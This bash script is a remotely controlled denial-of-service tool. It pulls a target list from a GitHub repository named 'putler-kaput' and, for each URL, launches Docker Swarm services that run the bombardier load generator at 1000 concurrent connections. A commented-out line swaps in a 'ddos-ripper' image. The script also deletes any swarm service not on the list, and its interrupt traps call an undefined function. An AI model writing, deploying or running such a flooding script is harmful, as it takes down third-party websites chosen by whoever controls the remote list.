#!/bin/bash

set -e

trap cleanup INT
trap cleanup SIGTERM

function ctrl_c() {
  rm -f "/tmp/tasks_last.csv"
}

readonly BASH_COMMONS_DIR="/opt/gruntwork/bash-commons"
source "$BASH_COMMONS_DIR/array.sh"
source "$BASH_COMMONS_DIR/log.sh"

max_containers=${1}

curl --request GET -sL \
     --url 'https://raw.githubusercontent.com/supersmile2009/putler-kaput/main/tasks.csv'\
     --output '/tmp/tasks.csv'

if [ -f "/tmp/tasks_last.csv" ]; then
  last=$(cat "/tmp/tasks_last.csv")
  new=$(cat "/tmp/tasks.csv")
  if [[ "${last}" == "${new}" ]]; then
    rm "/tmp/tasks.csv"
    log_info "Tasks didn't change"
    exit 0
  fi
fi

IFS=$'\n' read -r -d '' -a running_services < <( docker service ls --format "{{.Name}}" && printf '\0' )

required_services=()
urls=()
coeffs=()
coeffs_sum=0
while read -r line
do
  entries=( $(array_split "," "${line}") )
  required_services+=("${entries[0]}")
  urls+=("${entries[1]}")
  coeffs+=("${entries[2]}")
  coeff="${entries[2]}"
  coeffs_sum=$((coeffs_sum + coeff))
done < /tmp/tasks.csv

for running_s in "${running_services[@]}"; do
  if ! array_contains "${running_s}" "${required_services[@]}"; then
    docker service rm "${running_s}"
    log_info "Removed service: ${running_s}"
  fi
done


for i in "${!required_services[@]}"; do
  service="${required_services[$i]}"
  url="${urls[$i]}"
  coeff="${coeffs[$i]}"
  replicas=$(( max_containers * coeff / coeffs_sum ))
  if ! array_contains "${service}" "${running_services[@]}"; then
    log_info "Starting service service: ${service}, replicas: ${replicas}, url: ${url}"
    docker service create --with-registry-auth -d --name "${service}" --replicas="${replicas}" alpine/bombardier -c 1000 "${url}"
#    docker service create --with-registry-auth -d --name "${service}" --replicas="${replicas}" nitupkcuf/ddos-ripper:latest "${url}"
  else
    log_info "Updating service service: ${service}, replicas: ${replicas}, url: ${url}"
    docker service scale -d "${service}=${replicas}"
  fi
done

mv /tmp/tasks.csv /tmp/tasks_last.csv
